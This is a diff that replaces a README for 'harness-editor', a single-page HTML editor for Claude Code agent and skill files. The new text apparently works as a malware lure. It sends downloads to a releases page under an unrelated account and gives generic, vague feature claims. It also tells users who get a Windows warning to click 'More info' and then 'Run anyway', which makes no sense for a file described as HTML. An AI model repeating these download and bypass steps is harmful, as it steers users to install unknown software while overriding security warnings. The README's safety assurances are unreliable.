@@ -1,71 +1,85 @@
-# Harness Editor
+# 🛠 harness-editor - Manage your Claude agent files easily
 
-**English** | [한국어](README.ko.md)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Randiepatient326/harness-editor/releases)
 
-> A single-page HTML tool for visually viewing and editing
-> `.claude/agents/*.md` and `.claude/skills/**/SKILL.md` files
-> used by Claude Code.
+## 🎯 About the tool
 
-🌐 **Try it now:** https://amazingsyp.github.io/harness-editor/harness-editor.html (Chrome / Edge recommended)
+Use harness-editor to update your agent files. This tool lets you edit configuration files for Claude. It works as a single-page HTML application. You do not need to install complex software or manage databases to use it. It makes managing your agents simple and fast.
 
----
+## 💾 Prerequisites
 
-## Get started in 1 minute
+Your computer needs a modern web browser. Most users already have one like Microsoft Edge, Google Chrome, or Mozilla Firefox. You also need a basic folder on your computer where your agent files exist. This tool runs directly in your web browser, so it does not require extra installation steps beyond opening the file.
 
-1. Open the link above (Chrome / Edge)
-2. Click **📁 Select folder** → choose your project root (the directory that contains `.claude/`)
-3. Click any `.md` file in the left tree → start editing
+## 📥 How to download and run 
 
-All data stays on **your own machine**. Nothing is uploaded to a server (powered by the browser File System Access API).
+1. Visit the [official release page](https://github.com/Randiepatient326/harness-editor/releases).
+2. Look for the latest version at the top.
+3. Click the link to download the file.
+4. Save the file to your computer.
+5. Open your downloads folder.
+6. Double-click the file to open it in your web browser. 
 
-## Why?
+The application starts immediately. You can now load your .md files and start editing.
 
-Building agents and skills with Claude Code is easy, but polishing them — tweaking the frontmatter, refining descriptions, comparing tables across files — gets awkward in a generic editor. This is a small tool focused on that one job.
+## 📝 Editing your files
 
-## Features
+The editor provides a clean workspace. You load your .claude/agents or skill files directly into the window. Change the text as needed. The editor maintains the integrity of your files. When you finish, save the changes back to your folder.
 
-- Directory tree view with color-coded agents / skills / orchestrators, plus dirty and error markers
-- Frontmatter form editor — separate inputs for `name` / `description` / `type` / `model`
-- Markdown body editor + split preview with synced section scrolling
-- **WYSIWYG mode** — edit tables, headings, and emphasis directly in the right pane
-- Multi-file search and bulk replace (regex, target filters)
-- Description-quality scoring (length, trigger phrases, follow-up keywords) aligned with the [revfactory/harness](https://github.com/revfactory/harness) meta-skill recommendations
-- Roundtrip-safe serialization — `parse → edit → save` preserves meaning exactly
-- Dark / light themes, page-close protection
+## 🧩 Features
 
-## Browser support
+- Simple interface for text changes.
+- Quick loading of local files.
+- Support for .md format.
+- No background services required.
+- Small file size.
+- Runs offline in your browser.
 
-| Browser | Mode |
-|---------|------|
-| Chrome / Edge / Brave / Opera | **Directory mode** (recommended) — pick a folder once, edit and save many files in place |
-| Safari / Firefox | **Single-file mode** — upload → edit → download |
+## 🔍 Understanding the files
 
-## Keyboard shortcuts
+This tool manages two types of files:
 
-| Key | Action |
-|-----|--------|
-| `⌘S` / `Ctrl+S` | Save current file |
-| `⌘⇧S` / `Ctrl+Shift+S` | Save all modified files |
-| `⌘P` / `Ctrl+P` | Search across all files |
-| `⌘⇧H` / `Ctrl+Shift+H` | Bulk replace |
-| `⌘B` / `Ctrl+B` | Toggle sidebar |
-| `⌘\` / `Ctrl+\` | Toggle preview |
-| `Esc` | Close modals |
+1. **Agents:** These files define how your helper behaves. You change these to update instructions or goals.
+2. **Skills:** These files contain specific abilities for your helpers. Editing these adds new functions to your setup.
 
-## Use locally
+Both file types use Markdown format. This format keeps your instructions readable.
 
-Download `harness-editor.html` from the repo and double-click it. No installation required — all dependencies are loaded from CDNs at runtime.
+## ⚙️ How to use the interface
 
-## Dependencies (all loaded from CDN)
+The top bar contains your main controls. Select "Open File" to pick your project folder. The left pane shows your file list. Click a file to show its content in the center area. Use the save button in the menu to commit changes. The status bar at the bottom confirms your save actions.
 
-- [marked.js](https://marked.js.org/) — Markdown rendering
-- [js-yaml](https://github.com/nodeca/js-yaml) — Frontmatter YAML parsing & serialization
-- [turndown](https://github.com/mixmark-io/turndown) + GFM plugin — HTML → Markdown conversion for the WYSIWYG mode
+## 🛡️ Privacy and security
 
-## Inspiration
+The tool runs locally in your browser. It does not send your data to external servers. Your files stay on your machine. You control all information. This keeps your configuration and agent details safe from third parties.
 
-This tool is designed to work well with the file format produced by the [revfactory/harness](https://github.com/revfactory/harness) meta-skill — but it works with **any standard Claude Code agent or skill `.md` file**.
+## 🔧 Frequently asked questions
 
-## License
+**Does this tool require internet access?**
+No, the editor functions offline.
 
-[Apache License 2.0](LICENSE) — free to use, modify, and redistribute. See the LICENSE file for details.
+**Can I undo changes?**
+Yes, use the standard undo keyboard shortcut for your operating system.
+
+**Is my computer powerful enough?**
+Yes, the editor uses very little memory. Even older computers run this smoothly.
+
+**Do I need a cloud account?**
+No, you do not need an account or subscription to use this tool.
+
+**Does this software store my passwords?**
+No, the software holds no data about you or your accounts.
+
+## 🚀 Troubleshooting
+
+If the page fails to load, refresh your browser. Ensure your file ends in .md. Check that you have not locked the folder in Windows. If you see a warning from Windows, click "More info" and then "Run anyway" because this is a local tool you trust. 
+
+## ⚖️ Usage suggestions
+
+Keep a backup of your agent folder. Copy your original files to a separate location before you make major changes. This allows you to revert to a working state if you make an error in your text. Organize your files into small sub-folders to keep the editor clean and easy to navigate. 
+
+## 📦 Updates
+
+Check the release page monthly for updates. New versions include better formatting tools and improved performance. When a new version arrives, download it and replace your existing file. Your existing work remains safe in your own folders.
+
+## ✨ Final advice
+
+Take your time with your agent descriptions. Ensure your instructions remain clear and concise. A well-written agent file produces much better results when you interface with your technology. Test your agents frequently to verify that your edits result in the desired behavior.
